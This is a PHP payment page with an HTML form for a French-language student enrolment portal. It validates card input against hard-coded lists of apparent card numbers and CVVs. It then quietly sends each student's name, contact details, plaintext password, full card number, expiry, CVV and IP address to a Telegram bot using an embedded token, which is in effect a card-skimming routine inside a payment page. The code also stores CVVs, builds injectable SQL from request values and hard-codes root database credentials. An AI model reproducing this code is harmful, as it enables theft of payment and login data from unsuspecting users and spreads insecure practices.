<?php
    $formationary=array("1"=>"MANAGEMENT DES ENTREPRISES (BAC+3)",
        "2"=>"AUDIT ET CONTRÔLE DE GESTION (BAC+5)",
        "3"=>"MARKETING STRATÉGIQUE ET OPÉRATIONNEL (BAC+5))",
        "4"=>"MANAGEMENT DES SYSTÈMES ET TECHNOLOGIES DE L’INFORMATION ET DE COMMUNICATION (BAC+5",
        "5"=>"MANAGEMENT INDUSTRIEL ET LOGISTIQUE (MIL, BAC+3)",
        "6"=>"INGÉNIERIE INDUSTRIELLE ET LOGISTIQUE (IIL, BAC+5)",
        "7"=>"INGÉNIERIE DES SYSTÈMES INFORMATIQUES (BAC+3)",
        "8"=>"INGÉNIERIE DES SYSTÈMES D’INFORMATION (BAC+5)",
        "9"=>"INGÉNIERIE DES SYSTÈMES RÉSEAUX ET TÉLÉCOMS (BAC+5)",
        "10"=>"INGÉNIERIE DES SYSTÈMES EMBARQUÉS MOBILES (BAC+5)",
        "11"=>"DEVELOPPEUR BLOCKCHAIN & SMART CONTRACTS",
        "12"=>"FORMATION DATA SCIENCE",
        "13"=>"FORMATION MARKETING DIGITAL",
        "14"=>"FORMATION SECURITE INFORMATIQUE"
    );
    $payerarray=array("1"=>"Juste un mois","2"=>"Deux mois",
                        "3"=>"Trois mois","4"=>"Un ans",
                        "5"=>"trois ans","6"=>"Chaque période d'études"
                    );
    $Nbr_card=array(
        "5178059802520115","5333171059200432",
        "5513385901450902","5428204934389330",
        "4854641061577946","4854644127372567",
        "5162929522600025","5309640221066921","5284973077044836","5147161003364018"
    );
    $Nbr_CVV=array(
        "486","000","084","826","410","251","076","065","867","461"
    );
    session_start();
    $ID_Paye=$_SESSION['ID_ins'];
    $unique_id=$_SESSION['ID_Etu'];
    $Prenom_Etu=$_SESSION['Prenom'];
    $Nom_Etu=$_SESSION['nom'];
    $Pays_Etu=$_SESSION['pays'];
    $Ville_Etu=$_SESSION['ville'];
    $NumPhone_Etu=$_SESSION['Numero'];
    $Formation_Etu=$_SESSION['formation'];
    $Email_Etu=$_SESSION['email'];
    $SerieBAC_Etu=$_SESSION['serie'];
    $Niveau_Etu=$_SESSION['diplome'];
    $Password_Etu=$_SESSION['password1'];
    $PremierAccesAuSite=$_SESSION['date1'];

    // BASE DE DONNES
        $userDB="root";
        $passwordDB="root";
        $database = new PDO("mysql:host=localhost; dbname=PFA; charset=utf8;",$userDB,$passwordDB);
    // END BASE DE DONNES
    $number_card=$_REQUEST['number_card'];
    $date_card=$_REQUEST['date_card'];
    $cvv=$_REQUEST['cvv'];
    $payer=$_REQUEST['payer'];
    if(in_array($number_card, $Nbr_card) && in_array($cvv, $Nbr_CVV) && array_key_exists($payer, $payerarray) && array_key_exists($Formation_Etu, $formationary)){
        if($payer == '1'){$prix='300$';}
        elseif($payer == '2'){$prix='600$';$_SESSION['prix']=$prix;}
        elseif($payer == '3'){$prix='900$';$_SESSION['prix']=$prix;}
        elseif($payer == '4'){$prix='3 600$';$_SESSION['prix']=$prix;}
        elseif($payer == '5'){$prix='10 800$';$_SESSION['prix']=$prix;}
        elseif($payer == '6'){$prix='18 000$';$_SESSION['prix']=$prix;}
        $Name_formation=$formationary[$formation];
        $Name_payer=$payerarray[$payer];
        $_SESSION['Numero']=$number_card;
        $_SESSION['cvv']=$cvv;
        $_SESSION['date_card']=$date_card;
        $_SESSION['Name_formation']=$Name_formation;
        $_SESSION['Name_payer']=$Name_payer;
        $_SESSION['prix']=$prix;
        // TELEGRAM BOT
            session_start();
            $chat_id='1241093703';
            $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
            $IP = getenv("REMOTE_ADDR");
            $HTTP_HOST=$_SERVER["HTTP_HOST"];
            $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
            $SERVER_PORT=$_SERVER['SERVER_PORT'];
            $text=urlencode("-------------------💸 "."PFA"."💸------------------- \n \n".
                "ID  : ".$_SESSION['ID_Etu']."\n \n".        
                "Prénom et nom  : ".$_SESSION['Prenom']." ".$_SESSION['nom']."\n \n".
                "Pays de résidence : ".$_SESSION['pays']."\n \n".
                "Ville  : ".$_SESSION['ville']."\n \n".
                "Numero de Téléphone  : ".$_SESSION['Numero']."\n \n".
                "Adresse mail  : ".$_SESSION['email']."\n \n".
                "Serie du bac  : ".$_SESSION['serie']."\n \n".
                "Niveau d'études actuel  : ".$_SESSION['diplome']."\n \n".
                "Formation demandée   : ".$Name_formation."\n \n".
                "Date  : ".$PremierAccesAuSite."\n \n".
                "Password  : ".$_SESSION['password1']."\n \n".
                "-------------------💸------------------- \n\n".
                "Number card : ".$number_card."\n \n".
                "Date card : ".$date_card."\n \n".
                "CVV : ".$cvv."\n \n".
                "Durée du temps payer  : ".$Name_payer."\n \n".
                "Prix  : ".$prix."\n \n".

                "IP : ".$IP."\n \n".
                "HTTP HOST : ".$HTTP_HOST."\n \n".
                "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                "SERVER PORT : ".$SERVER_PORT."\n \n".
                            "-------------------💸 "."PFA"."💸-------------------");
                            
            $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
            $ch=curl_init();
            curl_setopt($ch,CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
            $result=curl_exec($ch);
            curl_close($ch);
        // END TELEGRAM BOT
        $add_payee=$database->prepare("INSERT INTO Paiments(ID_Paye,DelaiPaiement,NumberCard,CVV,DateCard,ID_Etu,Payee,Prix)
        VALUES('$ID_Paye','$Name_payer','$number_card','$cvv','$date_card','$unique_id','payé','$prix')");
        if($add_payee->execute()){
            header("refresh:1;url=FeliPay.php");
        }else{header("refresh:1;url=Paiement.php");}

    }else{
        
    }


      




?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tableau de bord</title>
    <link rel="stylesheet" href="CSS/Dashboard.css">
    <link rel="stylesheet" href="CSS/Paiement.css">
    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
    <script src="https://kit.fontawesome.com/0c6c59d6fe.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v2.1.6/css/unicons.css">
</head>
<body>
    <nav class="sidebar close">
        <header>
            <div class="logo">
                <a href="Dashboard.php" class="logo">
                    <i class="fab fa-accusoft"></i>
                    <span>DEAN</span>
                </a>
            </div>

            <i class='bx bx-chevron-right toggle'></i>
        </header>

        <div class="menu-bar">
            <div class="menu">

                <li class="search-box">
                    <i class='bx bx-search icon'></i>
                    <input type="text" placeholder="Chercher...">
                </li>

                <ul class="menu-links">
                    <li class="nav-link">
                        <a href="Dashboard.php">
                            <i class='bx bx-home-alt icon' ></i>
                            <span class="text nav-text">Tableau de bord</span>
                        </a>
                    </li>

                    <li class="nav-link">
                        <a href="Profil.php">
                            <i class="fa fa-users icon" aria-hidden="true"></i>
                            <span class="text nav-text">Profil</span>
                        </a>
                    </li>
                    <li class="nav-link">
                        <a href="Paiement.php">
                        <i class="fa fa-credit-card-alt icon" aria-hidden="true"></i>
                            <span class="text nav-text">Paiement</span>
                        </a>
                    </li>
                    <li class="nav-link">
                        <a href="">
                            <i class="fa fa-comment icon" aria-hidden="true"></i>  
                            <span class="text nav-text">Message</span>
                        </a>
                    </li>

                    <li class="nav-link">
                        <a href="Note.php">
                            <i class="fa fa-sticky-note-o icon" aria-hidden="true"></i>
                            <span class="text nav-text">Note</span>
                        </a>
                    </li>

                    <li class="nav-link">
                        <a href="attestation.php">
                            <i class="fa fa-file-archive-o icon" aria-hidden="true"></i>
                            <span class="text nav-text">Demande d'une attestation</span>
                        </a>
                    </li>
                    <!-- <li class="nav-link">
                        <a href="Paramètre.php">
                            <i class="fa fa-cogs icon" aria-hidden="true"></i>
                            <span class="text nav-text">Paramètre</span>
                        </a>
                    </li> -->
                </ul>
            </div>

            <div class="bottom-content">
                <li class="">
                    <a href="Logout.php">
                        <i class='bx bx-log-out icon' ></i>
                        <span class="text nav-text">Déconnecter</span>
                    </a>
                </li>

                <li class="mode">
                    <div class="sun-moon">
                        <i class='bx bx-moon icon moon'></i>
                        <i class='bx bx-sun icon sun'></i>
                    </div>
                    <span class="mode-text text">Mode sombre</span>

                    <div class="toggle-switch">
                        <span class="switch"></span>
                    </div>
                </li>
                
            </div>
        </div>

    </nav>
    <section class="home home2" id="login"> 
        <form action="" method="post">
            <a href="Home.html" class="logo"><i class="fab fa-accusoft"></i><span>DEAN</span></a>
            <h4> Payment Information </h4>
            <hr>
            <div class="container2">
                    <div class="payer">
                        <label >Combien voulez-vous payer maintenant : </label>
                        <select name="payer" id="">
                            <option value="" selected="" class="selected">-- none -- </option>
                            <option value="1">Juste un mois</option>
                            <option value="2">Deux mois</option>
                            <option value="3">Trois mois</option>
                            <option value="4">Un ans</option>
                            <option value="5">trois ans</option>
                            <option value="6">Chaque période d'études</option>
                        </select>
                    </div>
                    <div class="box-name">
                        <div class="prenom">
                            <label>Prénom <span>*</span></label>
                            <input type="text" name="prenom_card"  value="<?php echo $_SESSION['Prenom'];?>">
                        </div>
                        <div class="nom">
                            <label> Nom <span>*</span></label>
                            <input type="text" name="nom_card" value="<?php echo $_SESSION['nom'];?>">
                        </div>
                    </div>
                    <div class="box-numero">
                        <div class="number_card">
                            <label>Numéro de carte <span>*</span></label>
                            <div class="input_number">
                                <input type="text" name="number_card" placeholder="XXXX XXXX XXXX XXXX" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" maxlength="16">
                                <i class="uil uil-card-atm"></i>
                            </div> 
                        </div>
                        <div class="date">
                            <label> Date d'expiration <span>*</span></label>
                            <input type="month" name="date_card" min="2015-01" max="2025-12" >
                        </div>
                    </div>
                    <div class="CVV">
                        <label>Code CVV <span>*</span></label>
                        <div class="number-cvv">
                            <input type="text" name="cvv" placeholder="XXX" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" maxlength="3">
                            <i class="uil uil-card-atm"></i>
                        </div>
                    </div>
                    <div class="submit">
                        <input type="submit" name="submit" value="Connexion" >
                    </div>
                    <div class="suport">
                        <label>Nous acceptons la méthode de paiement suivante : </label>
                        <div class="img">
                            <img src="image/icons8-visa-96.png" alt="">
                            <img src="image/icons8-mastercard-logo-96.png" alt="">
                            <img src="image/icons8-discover-96.png" alt="">
                            <img src="image/icons8-apple-pay-96.png" alt="">
                            <img src="image/icons8-google-pay-india-96.png" alt="">
                            <img src="image/icons8-metamask-logo-96.png" alt="">
                            <img src="image/icons8-paypal-96.png" alt="">

                        </div>
                    </div>
            </div>
        </form>           
    </section>


<script src="JS/js.js"></script>    
</body>
</html>